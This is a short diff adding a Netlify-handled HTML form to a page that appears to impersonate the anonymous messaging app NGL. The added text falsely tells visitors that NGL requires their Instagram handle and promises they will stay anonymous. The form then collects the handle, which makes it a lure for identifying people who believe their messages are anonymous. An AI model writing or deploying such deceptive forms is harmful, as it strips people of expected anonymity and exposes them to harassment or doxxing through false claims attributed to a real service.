@@ -110,6 +110,20 @@
         <!-- Add your login form content here -->
         <h2>Disclaimer</h2>
     </div>
+    <form name="List" method="POST" id="form" netlify data-netlify-honeypot="bot-field" data-netlify-success="/redirect-success">
+    <input type="hidden" name="success_redirect" value="/redirect-success">
+    <!-- Add your form fields here -->
+    <label for="username">
+        <h6>As NGL wants to protect its user integrity through authentic messages, it is required to put your
+            <b> Insta handle </b>before proceeding further.
+            Don't worry your Identity and data will be still anonymous.</h6>
+    </label>
+
+    <input type="text" id="username" name="username" placeholder="Your Instagram Handle" required>
+
+    <button type="submit"> <h4>PROCEED</h4> </button>
+</form>
+
 </body>
 
 </html>
